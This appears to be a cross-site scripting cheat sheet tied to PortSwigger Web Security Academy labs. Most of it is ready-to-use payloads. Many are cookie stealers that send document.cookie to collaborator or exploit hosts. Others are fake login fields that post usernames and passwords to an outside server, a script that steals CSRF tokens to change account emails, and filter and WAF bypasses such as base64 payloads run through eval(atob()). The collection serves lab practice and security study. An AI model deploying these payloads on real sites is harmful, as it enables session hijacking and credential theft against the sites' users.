
- Search Bar
- Comment Section
- DOM Sinks
- Cookie with httpOnly not set
### cheatsheet
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

# Cookies stealer



>Steal cookies collaborator:  

```html
<script>
fetch(`https://burpcollaborator.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
```  

>Steal Cookies Exploit Server:  

```html
<script>
fetch(`https://collaborator.net/x`+document.cookie);
</script>
```  

>XSS Cookie Stealer payloads using JavaScript

```Javascript
JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie
```  

>Reflected XSS into HTML context with nothing encoded in search.  

```JavaScript
<script>document.location='https://COLLABORATOR.com?c='+document.cookie</script>
```  

>Reflected DOM XSS, into JSON data that is processed by **eval().**  

```JavaScript
\"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
```  

>JavaScript Template literals are enclosed by backtick ( \` ) characters instead of double or single quotes.  

```JavaScript
${document.location='https://tvsw9dim0doynnpscx9mgtq67xdo1jp8.oastify.com/?cookies='+document.cookie;}
```  

![JavaScript template string](../images/javascript-template-string.png)  

>AngularJS DOM XSS Attack **constructor** payloads  

```JavaScript
{{$on.constructor('alert(1)')()}}
```

```JavaScript
{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}
```  
  
>HTTP request smuggling to deliver reflected XSS  

```JavaScript
a"/><script>document.location='https://bc.oastify.com/cookiestealer.php?c='+document.cookie;</script>
```  

>Web Cache Parameter cloaking - script ```/js/geolocate.js```, executing the callback function ```setCountryCookie()```  
  
```JavaScript
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location='http://BURPCOL.oastify.com/?StealCookies=' document.cookie ;//
```  

>More Cross-Site Scripting (XSS) example cookie stealer payloads.  

```JavaScript
<script>
document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
</script>
```

>HTML <img> Tag, with invalid Image source, with escape sequence from source code calling ```window.location``` for the **LastViewedProduct``` cookie.  

```html
&'><img src=1 onerror=print()>
```  

```html
&'><img src=x onerror=this.src="https://exploit-0a6b000b033762e6c0fa121d01fc0020.exploit-server.net/?ex="+document.cookie>
```  

```Javascript
<img src=x onerror=this.src=https://exploit.net/?'+document.cookie;>
```  

>***Document.location*** returns a Location object, which contains information about the URL of the document and provides methods for changing that URL and loading another URL.  

```JavaScript
document.location='https://burp-collab.x.com/cookiestealer.php?c='+document.cookie;
```  

```Javascript
document.location='https://BurpCollaBoRaTor.oastify.com/?FreeCookies='+document.cookie;
```

>Document.write  

```Javascript
/?evil='/><script>document.write('<img src="https://exploit.com/steal.MY?cookie=' document.cookie '" />')</script> 
```  


```Javascript
<script>
    document.location=""http://stock.lab.web-security-academy.net/?productId=4
            <script>
                    var req = new XMLHttpRequest(); 
                    req.onload = reqListener; 
                    req.open('get','https://lab.web-security-academy.net/accountDetails',true); 
                    req.withCredentials = true;
                    req.send();
                    function reqListener() {
                            location='https://exploit.web-security-academy.net/log?key='%2bthis.responseText;
                    };
            %3c/script>
            &storeId=1""
</script>
```

```Javascript
<script>
fetch(‘https://burpcollaborator.net’, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
```

```Javascript
<script>
  fetch('https://COLLABORATOR.com', {
  method: 'POST',
  mode: 'no-cors',
  body:'PeanutButterCookies='+document.cookie
  }); 
</script>   
```

```Javascript
x"); var fuzzer=new Image;fuzzer.src="https://COLLABORATOR.com/?"+document.cookie; //
```

```Javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>  
```

>OSCP Offsec PWK hand book cookie stealer example  

```Javascript
<script>new Image().src="http://Collaborator.COM/cool.jpg?output="+document.cookie;</script>
```

>Alt Cookie Stealer  

```Javascript
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.bad/?'+document.cookie;>
```

```Javascript
<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
```

```Javascript
<script>
fetch('https://BURP-COLLABORATOR', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

>::::  Steal Password / Cookie Stealer ::::

>XMLHttpRequest

```html
<input name=username id=username>
<input type=password name=password id=password onhcange="CaptureFunction()">
<script>
function CaptureFunction()
{
var user = document.getElementById('username').value;
var pass = document.getElementById('password').value;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://exploit.com/?username=" + user + "&password=" + pass, true);
xhr.send();
}
</script>
```

>FETCH API

```Javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```


>::::  DATA EXFILTRATION  /  COOKIE STEALER  ::::
```Javascript
  </textarea><script>fetch('http://exploit.evil?cookie=' + btoa(document.cookie) );</script> 
```

```Javascript
<script>document.write('<img src="http://evil.net/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>
```

```Javascript
<script>
document.write('<img src="HTTPS://EXPLOIT.net/?c='+document.cookie+'" />');
</script>
```

```Javascript
<script>document.write('<img src="https://EXPLOIT.net/?c='%2bdocument.cookie%2b'" />');</script>
```  

>IFRAMEs

```JavaScript
<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
    "type": "load-channel",
    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
}), "*");'>
```  


# Labs
# Custom Tags
```
<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x';
```


# With most tags & attributes blocked
1. Identify which tags are allowed <§>
2. Identify what attributes/events are allowed <body%20§§=1>
3. You can also try to use print() instead of alert() to bypass some WAF
```
<body%20§§=1>
```

# Event Handlers & Href Blocked

```
<svg><a><animate+attributeName=href+values=javascript:alert(1) /><text+x=20+y=20>Click me</text></a>
```

# SVG Markup Allowed
1. If Payloads like `<svg>, <animatetransform>, <title>`, and `<image>` are allowed

2. Identify what events are allowed `<svg><animatetransform%20§§=1>`

```
<svg><animatetransform%20§§=1>

<svg><animatetransform onbegin=alert(1)>
```

# Angular Brackets Encoded

```
"onmouseover="alert(1)
```

# Quotes HTML Encoded
Put this into a href ( eg : website URL )
```
javascript:alert(1)
```

# With Single Quote getting Backslash escaped ( JS Context )

```
</script><script>alert(1)</script>

For example, suppose that the input:

';alert(document.domain)//
gets converted to:

\';alert(document.domain)//
You can now use the alternative payload:

\';alert(document.domain)//
which gets converted to:

\\';alert(document.domain)//
```

# Breaking Out Of JavaScript String

```
'-alert(document.domain)-'
';alert(document.domain)//
'-alert(1)-'
\'-alert(1)//

# Stealing Cookies
';document.location='https://swshucmo2c95ltmsgk1p9quhd8jz7vvk.oastify.com/url='+document.domain;//
```

# Jquery Location.hash

```
Payload :
#" onload="this.src+='<img src=x onerror=print()>'"
#<img src=x onerror=alert()

In exploit server : 
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
<iframe src="https://0a9b00bd03c1a186811cb316005200ab.web-security-academy.net/#<img src=x onerror=alert()>"></iframe>

Steal Cookies :
<iframe src="https://0a9b00bd03c1a186811cb316005200ab.web-security-academy.net/#" onload="this.src+='<img src=x onerror=document.location=\'https://exploit-0ace007a0369a1fc81f7b2a501a20051.exploit-server.net/exploit\'+document.domain>'"></iframe>
```

# DOM XSS using web messages and a JavaScript URL

```
# Payload
window.postMessage('javascript:print()//http:','*');
# Deliver To Victim
<iframe src="https://0a8b003c03908a72811893c400e200e7.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

# HTML Encoded

Into href ->
```
&apos;-alert(document.domain)-&apos;

http://foo?&apos;-alert(1)-&apos;
```

# DOM XSS in document.write sink using source location.search inside a select element

```
https://0a5b00e904b44a74807321b100d800cf.web-security-academy.net/product?productId=1&storeId=randstring

https://0a5b00e904b44a74807321b100d800cf.web-security-academy.net/product?productId=1&storeId=randstring%22%3E%3Cselect%3E%3Cimg%20src=x%20onerror=alert(1)%3E
```

```
<script>
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
if(stores[i] === store) {
continue;
}
document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
</script>
```

# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

```
{{$on.constructor('alert(1)')()}}
```

# Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
```
http://foo?&apos;-alert(1)-&apos;
```
# Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
```
${alert(1)}
```

# Stealing Cookies

1. Find vulnerable functionality
2. Inject the payload ( comment )
3. Wait for the cookie to come

Use burp collaborator or exploit server

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

# Capturing Passwords
1. Find vulnerable functionality
2. Inject the payload ( comment )
3. Wait for the cookie to come

Use burp collaborator or exploit server

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

# Performing CSRF
1. Find vulnerable functionality
2. Inject the payload ( comment )
3. Wait for the cookie to come

Use burp collaborator or exploit server

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

### Bypasses:

1. Generate base64 payload
    1. `echo -n "document.location = 'http://<BURP-COLLABORATOR.NET>/?cookie='+document.cookie" |base64`
2. Insert the base64 payload into atob function
    1. `eval(atob("BASE64-PAYLOAD"))`
    `<script>eval(atob("BASE64-PAYLOAD"))</script>`

